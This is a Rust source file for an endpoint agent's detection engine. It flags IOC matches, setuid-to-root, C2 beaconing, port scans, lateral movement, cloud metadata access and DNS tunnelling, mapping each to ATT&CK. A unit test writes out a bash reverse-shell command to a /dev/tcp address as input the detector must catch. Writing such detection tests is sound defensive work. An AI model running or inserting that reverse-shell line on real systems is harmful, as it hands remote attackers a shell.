//! Local detection engine — behavioural + IOC analytics over the event stream.
//!
//! The engine sits in the main event consumer: every collected [`AgentEvent`]
//! is passed through [`DetectionEngine::inspect`], which returns zero or more
//! *new* detection events (class [`EventClass::Detection`]).  Those are fed
//! back into the same pipeline, so detections are persisted, shipped to the
//! backend and (optionally) acted on by the prevention engine like any other
//! event.
//!
//! Why in userspace, not eBPF: this analytics layer is **platform-neutral** by
//! design.  The Linux collectors and the future Windows collectors emit the
//! same [`crate::schema`] events, so this engine — IOC matching, ATT&CK-mapped
//! behavioural heuristics, C2 beaconing — works unchanged on both. eBPF only
//! changes *how* the raw telemetry is gathered, not how it is judged.
//!
//! Sources covered today:
//!   * process exec/create  → [`behavior`] heuristics + IOC hash match
//!   * network connections  → IOC IP match + [`beaconing`] cadence analysis
//!   * DNS queries          → IOC domain match
//!
//! It never blocks the consumer: inspection is synchronous, allocation-light
//! and lock-scoped to the beacon tracker only.

mod beaconing;
mod behavior;
mod dns_tunnel;
pub mod honeytoken;
mod ioa;
mod ioc;
mod netscan;

#[cfg(feature = "yara")]
pub mod yara_scanner;

use std::sync::{Mutex, RwLock};
use std::time::Instant;

use tracing::{info, warn};

use crate::schema::{
    AgentEvent, DetectionData, EventAction, EventClass, EventData, Severity, SetuidData,
};

pub use ioc::IocSet;

/// The detection engine.  Cheap to share behind an `Arc`; only the beacon
/// tracker is mutable (guarded by a `Mutex`).
pub struct DetectionEngine {
    agent_id: String,
    hostname: String,
    iocs: RwLock<IocSet>,
    beacons: Mutex<beaconing::BeaconTracker>,
    netscan: Mutex<netscan::NetScanTracker>,
    dns_tunnel: Mutex<dns_tunnel::DnsTunnelTracker>,
    /// Stateful attack-chain correlation over the process tree (IOA).
    ioa: Mutex<ioa::IoaEngine>,
    started: Instant,
}

impl DetectionEngine {
    /// Build an engine, loading IOCs from `<config>/iocs.json` if present.
    pub fn new(agent_id: String, hostname: String) -> Self {
        let ioc_path = crate::paths::config_dir().join("iocs.json");
        let iocs = IocSet::load(&ioc_path);
        if iocs.is_empty() {
            info!(
                path = %ioc_path.display(),
                "Detection engine: no IOC feed loaded (place indicators there to enable IOC matching)"
            );
        } else {
            info!(path = %ioc_path.display(), count = iocs.len(), "Detection engine: IOC feed loaded");
        }
        Self {
            agent_id,
            hostname,
            iocs: RwLock::new(iocs),
            beacons: Mutex::new(beaconing::BeaconTracker::new()),
            netscan: Mutex::new(netscan::NetScanTracker::new()),
            dns_tunnel: Mutex::new(dns_tunnel::DnsTunnelTracker::new()),
            ioa: Mutex::new(ioa::IoaEngine::new()),
            started: Instant::now(),
        }
    }

    /// Number of loaded IOCs (diagnostics / tests).
    pub fn ioc_count(&self) -> usize {
        self.iocs.read().map(|i| i.len()).unwrap_or(0)
    }

    /// Reload the IOC feed from `<config>/iocs.json`.  Called periodically so a
    /// threat-intel sync that rewrites the file takes effect without a restart.
    pub fn reload_iocs(&self) {
        let path = crate::paths::config_dir().join("iocs.json");
        if !path.exists() {
            return;
        }
        let fresh = IocSet::load(&path);
        match self.iocs.write() {
            Ok(mut guard) => {
                if fresh.len() != guard.len() {
                    info!(count = fresh.len(), "Detection engine: IOC feed reloaded");
                }
                *guard = fresh;
            }
            Err(e) => warn!("Detection engine: IOC lock poisoned on reload: {e}"),
        }
    }

    /// Spawn a background task that reloads the IOC feed every `secs` seconds.
    pub fn spawn_ioc_reloader(self: std::sync::Arc<Self>, secs: u64) {
        tokio::spawn(async move {
            let mut ticker = tokio::time::interval(std::time::Duration::from_secs(secs.max(30)));
            loop {
                ticker.tick().await;
                self.reload_iocs();
            }
        });
    }

    /// Inspect one event, returning any detections it triggers.
    ///
    /// Detections we raise ourselves are skipped to avoid feedback loops.
    pub fn inspect(&self, event: &AgentEvent) -> Vec<AgentEvent> {
        if matches!(event.class, EventClass::Detection) {
            return Vec::new();
        }

        let mut out = Vec::new();
        match &event.data {
            EventData::ProcessCreate(p) => {
                self.inspect_process(&p.name, &p.exe, &p.cmdline, p.exe_sha256.as_deref(), &mut out);
            }
            EventData::ProcessExec(p) => {
                self.inspect_process(&p.comm, &p.exe, &p.cmdline, p.exe_sha256.as_deref(), &mut out);
                if let Some(ref ld_preload) = p.ld_preload {
                    if let Some(d) = behavior::inspect_ld_preload(&p.comm, &p.exe, ld_preload) {
                        let sev = severity_for(d.confidence);
                        out.push(self.detection(sev, d));
                    }
                }
            }
            EventData::Setuid(s) => {
                self.inspect_setuid(s, &mut out);
            }
            EventData::NetworkConnection(n) => {
                self.inspect_network(&n.dst_addr, n.dst_port, &mut out);
            }
            EventData::NetworkSocket(n) => {
                self.inspect_network(&n.addr, n.port, &mut out);
            }
            EventData::Dns(d) => {
                // The eBPF DNS event carries the resolver address; treat the
                // destination as a domain candidate when it is non-numeric.
                self.inspect_domain(&d.dst_addr, &mut out);
            }
            EventData::FileOpen(f) => {
                self.inspect_file_open(&f.path, &f.comm, &mut out);
            }
            _ => {}
        }

        // Stateful IOA correlation. Updates the process tree from this event,
        // then (a) enriches the per-event findings above with the actor's
        // process lineage and (b) emits any attack chains that just completed.
        let ioa = self
            .ioa
            .lock()
            .map(|mut e| e.observe(event, Instant::now()))
            .unwrap_or_default();
        if let Some(lineage) = &ioa.lineage {
            for ev in out.iter_mut() {
                if let EventData::Detection(d) = &mut ev.data {
                    inject_lineage(&mut d.evidence, lineage);
                }
            }
        }
        for data in ioa.findings {
            let sev = severity_for(data.confidence);
            out.push(self.detection(sev, data));
        }

        out
    }

    // ── Per-source inspectors ────────────────────────────────────────────────

    fn inspect_process(
        &self,
        comm: &str,
        exe: &str,
        cmdline: &str,
        exe_hash: Option<&str>,
        out: &mut Vec<AgentEvent>,
    ) {
        // IOC: known-bad executable hash.
        if let Some(h) = exe_hash {
            let hit = self.iocs.read().map(|i| i.match_hash(h)).unwrap_or(false);
            if hit {
                out.push(self.detection(
                    Severity::Critical,
                    DetectionData {
                        rule_id: "ioc.process_hash".into(),
                        title: "Process matches known-bad hash".into(),
                        category: "ioc".into(),
                        mitre_tactic: Some("TA0002 Execution".into()),
                        mitre_technique: Some("T1204".into()),
                        confidence: 95,
                        subject: exe.to_string(),
                        detail: format!("Executable {exe} matches threat-intel hash {h}"),
                        evidence: serde_json::json!({ "hash": h, "comm": comm }),
                    },
                ));
            }
        }

        // Behavioural heuristics.
        if let Some(d) = behavior::inspect_process(comm, exe, cmdline) {
            let sev = severity_for(d.confidence);
            out.push(self.detection(sev, d));
        }
    }

    fn inspect_setuid(&self, s: &SetuidData, out: &mut Vec<AgentEvent>) {
        if s.new_uid == 0 && s.old_uid != 0 {
            out.push(self.detection(
                Severity::High,
                DetectionData {
                    rule_id:         "privesc.setuid_root".into(),
                    title:           "Privilege escalation via setuid(0)".into(),
                    category:        "privilege_escalation".into(),
                    mitre_tactic:    Some("TA0004 Privilege Escalation".into()),
                    mitre_technique: Some("T1548.001".into()),
                    confidence:      90,
                    subject:         s.comm.clone(),
                    detail:          format!(
                        "PID {} ({}) set effective UID to 0 (was UID {})",
                        s.pid, s.comm, s.old_uid
                    ),
                    evidence: serde_json::json!({
                        "pid":     s.pid,
                        "old_uid": s.old_uid,
                        "new_uid": s.new_uid,
                        "comm":    s.comm,
                    }),
                },
            ));
        }
    }

    fn inspect_network(&self, dst_addr: &str, dst_port: u16, out: &mut Vec<AgentEvent>) {
        // IOC: known-bad destination IP.
        let ip_hit = self.iocs.read().map(|i| i.match_ip(dst_addr)).unwrap_or(false);
        if ip_hit {
            out.push(self.detection(
                Severity::Critical,
                DetectionData {
                    rule_id: "ioc.network_ip".into(),
                    title: "Connection to known-bad IP".into(),
                    category: "ioc".into(),
                    mitre_tactic: Some("TA0011 Command and Control".into()),
                    mitre_technique: Some("T1071".into()),
                    confidence: 95,
                    subject: format!("{dst_addr}:{dst_port}"),
                    detail: format!("Outbound connection to threat-intel IP {dst_addr}:{dst_port}"),
                    evidence: serde_json::json!({ "ip": dst_addr, "port": dst_port }),
                },
            ));
        }

        let now = self.started.elapsed().as_secs_f64();

        // Beaconing cadence analysis (skip loopback / unspecified noise).
        if is_routable(dst_addr) {
            let key = format!("{dst_addr}:{dst_port}");
            let verdict = self
                .beacons
                .lock()
                .ok()
                .and_then(|mut b| b.observe(&key, now));
            if let Some(v) = verdict {
                out.push(self.detection(
                    Severity::High,
                    DetectionData {
                        rule_id: "beaconing.regular_interval".into(),
                        title: "Periodic C2 beaconing detected".into(),
                        category: "beaconing".into(),
                        mitre_tactic: Some("TA0011 Command and Control".into()),
                        mitre_technique: Some("T1071".into()),
                        confidence: 70,
                        subject: key.clone(),
                        detail: format!(
                            "Regular connections to {key}: ~{:.0}s interval over {} samples (CV {:.2})",
                            v.mean_interval_secs, v.samples, v.coefficient_of_variation
                        ),
                        evidence: serde_json::json!({
                            "mean_interval_secs": v.mean_interval_secs,
                            "cv": v.coefficient_of_variation,
                            "samples": v.samples,
                        }),
                    },
                ));
            }
        }

        // Reconnaissance / lateral-movement / IMDS heuristics run for every
        // destination (the tracker has its own filtering — and IMDS lives in
        // the 169.254.0.0/16 link-local range that `is_routable` excludes).
        let verdicts = self
            .netscan
            .lock()
            .map(|mut n| n.observe(dst_addr, dst_port, now))
            .unwrap_or_default();
        for v in verdicts {
            out.push(self.netscan_detection(dst_addr, dst_port, v));
        }
    }

    fn netscan_detection(
        &self,
        dst_addr: &str,
        dst_port: u16,
        verdict: netscan::NetVerdict,
    ) -> AgentEvent {
        use netscan::NetVerdict;
        let data = match verdict {
            NetVerdict::PortScan { target, ports } => DetectionData {
                rule_id: "recon.port_scan".into(),
                title: "Horizontal port scan of a single host".into(),
                category: "discovery".into(),
                mitre_tactic: Some("TA0007 Discovery".into()),
                mitre_technique: Some("T1046".into()),
                confidence: 70,
                subject: target.clone(),
                detail: format!("{ports} distinct ports contacted on {target} within the window"),
                evidence: serde_json::json!({ "target": target, "ports": ports }),
            },
            NetVerdict::LateralMovement { port, service, hosts } => DetectionData {
                rule_id: "lateral.admin_port_sweep".into(),
                title: format!("Lateral movement: {service} sweep across internal hosts"),
                category: "lateral_movement".into(),
                mitre_tactic: Some("TA0008 Lateral Movement".into()),
                mitre_technique: Some("T1021".into()),
                confidence: 75,
                subject: format!("{service}:{port}"),
                detail: format!("{hosts} distinct internal hosts contacted on {service} ({port})"),
                evidence: serde_json::json!({ "port": port, "service": service, "hosts": hosts }),
            },
            NetVerdict::ImdsAccess => DetectionData {
                rule_id: "cloud.imds_access".into(),
                title: "Access to cloud instance-metadata service".into(),
                category: "credential_access".into(),
                mitre_tactic: Some("TA0006 Credential Access".into()),
                mitre_technique: Some("T1552.005".into()),
                confidence: 55,
                subject: format!("{dst_addr}:{dst_port}"),
                detail: format!("Connection to cloud metadata endpoint {dst_addr} (IMDS credential theft vector)"),
                evidence: serde_json::json!({ "ip": dst_addr, "port": dst_port }),
            },
        };
        let severity = severity_for(data.confidence);
        self.detection(severity, data)
    }

    fn inspect_file_open(&self, path: &str, comm: &str, out: &mut Vec<AgentEvent>) {
        // Sensitive credential-store access (logic + lists live in the
        // filesystem collector, mirroring how `behavior` owns its heuristics).
        if let Some(d) = crate::collectors::linux::filesystem::inspect_sensitive_access(path, comm) {
            let sev = severity_for(d.confidence);
            out.push(self.detection(sev, d));
        }
    }

    fn inspect_domain(&self, domain: &str, out: &mut Vec<AgentEvent>) {
        let matched = self.iocs.read().ok().and_then(|i| i.match_domain(domain));
        if let Some(matched) = matched {
            out.push(self.detection(
                Severity::Critical,
                DetectionData {
                    rule_id: "ioc.dns_domain".into(),
                    title: "DNS query for known-bad domain".into(),
                    category: "ioc".into(),
                    mitre_tactic: Some("TA0011 Command and Control".into()),
                    mitre_technique: Some("T1071.004".into()),
                    confidence: 90,
                    subject: domain.to_string(),
                    detail: format!("Resolved {domain}, matching threat-intel domain {matched}"),
                    evidence: serde_json::json!({ "domain": domain, "matched": matched }),
                },
            ));
        }

        // DNS-tunneling cadence / label-length analysis.
        let now = self.started.elapsed().as_secs_f64();
        let verdict = self
            .dns_tunnel
            .lock()
            .ok()
            .and_then(|mut t| t.observe(domain, now));
        if let Some(v) = verdict {
            out.push(self.detection(
                Severity::High,
                DetectionData {
                    rule_id: "dns_tunnel.anomalous_query_volume".into(),
                    title: "Possible DNS tunneling".into(),
                    category: "exfiltration".into(),
                    mitre_tactic: Some("TA0011 Command and Control".into()),
                    mitre_technique: Some("T1071.004".into()),
                    confidence: 75,
                    subject: v.domain.clone(),
                    detail: format!(
                        "DNS tunneling indicators for {}: {} queries/min, avg label length {:.1} ({})",
                        v.domain, v.queries_per_min, v.avg_label_length, v.reason,
                    ),
                    evidence: serde_json::json!({
                        "domain": v.domain,
                        "queries_per_min": v.queries_per_min,
                        "avg_label_length": v.avg_label_length,
                        "reason": v.reason,
                    }),
                },
            ));
        }
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    fn detection(&self, severity: Severity, data: DetectionData) -> AgentEvent {
        AgentEvent::new(
            self.agent_id.clone(),
            self.hostname.clone(),
            EventClass::Detection,
            EventAction::Detected,
            severity,
            EventData::Detection(data),
        )
    }
}

/// Merge a process-lineage array into a detection's structured evidence so
/// every finding answers "how did the acting process come to exist". A `null`
/// evidence is promoted to an object; a non-object evidence is left untouched.
fn inject_lineage(evidence: &mut serde_json::Value, lineage: &serde_json::Value) {
    if evidence.is_null() {
        *evidence = serde_json::json!({});
    }
    if let Some(obj) = evidence.as_object_mut() {
        obj.insert("process_lineage".to_string(), lineage.clone());
    }
}

fn severity_for(confidence: u8) -> Severity {
    match confidence {
        0..=39 => Severity::Low,
        40..=69 => Severity::Medium,
        70..=89 => Severity::High,
        _ => Severity::Critical,
    }
}

/// True if `addr` is a routable destination worth cadence-tracking (skips
/// loopback, unspecified and obviously-local noise).
fn is_routable(addr: &str) -> bool {
    !(addr.is_empty()
        || addr == "0.0.0.0"
        || addr == "::"
        || addr == "127.0.0.1"
        || addr == "::1"
        || addr.starts_with("127.")
        || addr.starts_with("169.254."))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schema::{ExecEventData, NetworkConnectionData, ProcessCreateData};

    fn engine() -> DetectionEngine {
        DetectionEngine {
            agent_id: "a".into(),
            hostname: "h".into(),
            iocs: RwLock::new(
                IocSet::from_json(
                    br#"{"ips":["203.0.113.5"],"domains":["evil.test"],"hashes":["deadbeef"]}"#,
                )
                .unwrap(),
            ),
            beacons: Mutex::new(beaconing::BeaconTracker::new()),
            netscan: Mutex::new(netscan::NetScanTracker::new()),
            dns_tunnel: Mutex::new(dns_tunnel::DnsTunnelTracker::new()),
            ioa: Mutex::new(ioa::IoaEngine::new()),
            started: Instant::now(),
        }
    }

    fn proc_event(name: &str, exe: &str, cmd: &str) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Create,
            Severity::Info,
            EventData::ProcessCreate(ProcessCreateData {
                pid: 1,
                ppid: 0,
                name: name.into(),
                exe: exe.into(),
                cmdline: cmd.into(),
                uid: 0,
                username: "root".into(),
                exe_sha256: None,
            }),
        )
    }

    fn net_event(ip: &str, port: u16) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Network,
            EventAction::Connection,
            Severity::Info,
            EventData::NetworkConnection(NetworkConnectionData {
                protocol: "tcp".into(),
                src_addr: "10.0.0.2".into(),
                src_port: 5000,
                dst_addr: ip.into(),
                dst_port: port,
                state: "established".into(),
                pid: None,
                process: None,
            }),
        )
    }

    #[test]
    fn flags_reverse_shell_process() {
        let e = engine();
        let out = e.inspect(&proc_event("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"));
        assert_eq!(out.len(), 1);
        assert!(matches!(out[0].class, EventClass::Detection));
    }

    #[test]
    fn flags_ioc_ip() {
        let e = engine();
        let out = e.inspect(&net_event("203.0.113.5", 443));
        assert!(out.iter().any(|ev| matches!(&ev.data, EventData::Detection(d) if d.category == "ioc")));
    }

    #[test]
    fn flags_ioc_process_hash() {
        // A process whose collected exe_sha256 matches a threat-intel hash must
        // raise an ioc.process_hash detection (the hash now flows from the
        // collector through the event into the matcher).
        let e = engine();
        let ev = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Exec,
            Severity::Info,
            EventData::ProcessExec(ExecEventData {
                pid: 1,
                ppid: 0,
                uid: 0,
                gid: 0,
                username: "root".into(),
                comm: "x".into(),
                exe: "/tmp/x".into(),
                cmdline: "/tmp/x".into(),
                cwd: "/".into(),
                container_id: None,
                ld_preload: None,
                exe_sha256: Some("deadbeef".into()),
            }),
        );
        let out = e.inspect(&ev);
        assert!(
            out.iter().any(|d| matches!(&d.data, EventData::Detection(dd) if dd.rule_id == "ioc.process_hash")),
            "a known-bad exe hash should fire ioc.process_hash"
        );
    }

    #[test]
    fn clean_traffic_is_quiet() {
        let e = engine();
        assert!(e.inspect(&net_event("93.184.216.34", 443)).is_empty());
        assert!(e.inspect(&proc_event("ls", "/bin/ls", "ls -la")).is_empty());
    }

    #[test]
    fn flags_imds_access() {
        let e = engine();
        let out = e.inspect(&net_event("169.254.169.254", 80));
        assert!(
            out.iter().any(|ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "cloud.imds_access")),
            "connection to the cloud metadata endpoint should be flagged"
        );
    }

    #[test]
    fn flags_port_scan_via_engine() {
        let e = engine();
        let mut hit = false;
        for port in 1000..=1020u16 {
            if e.inspect(&net_event("198.51.100.50", port))
                .iter()
                .any(|ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "recon.port_scan"))
            {
                hit = true;
            }
        }
        assert!(hit, "scanning many ports on one host should be flagged");
    }

    #[test]
    fn does_not_inspect_own_detections() {
        let e = engine();
        let det = e.detection(
            Severity::High,
            DetectionData {
                rule_id: "x".into(),
                title: "t".into(),
                category: "c".into(),
                mitre_tactic: None,
                mitre_technique: None,
                confidence: 50,
                subject: "s".into(),
                detail: "d".into(),
                evidence: serde_json::Value::Null,
            },
        );
        assert!(e.inspect(&det).is_empty());
    }

    #[test]
    fn detects_beacon_over_regular_connections() {
        // Drive the beacon tracker directly with regular timestamps (the engine
        // path uses wall-clock spacing, which is not deterministic in a test).
        let mut t = beaconing::BeaconTracker::new();
        let mut hit = false;
        for i in 0..8 {
            if t.observe("198.51.100.20:8080", i as f64 * 60.0).is_some() {
                hit = true;
            }
        }
        assert!(hit, "expected a beaconing verdict for a regular 60s cadence");
    }
}
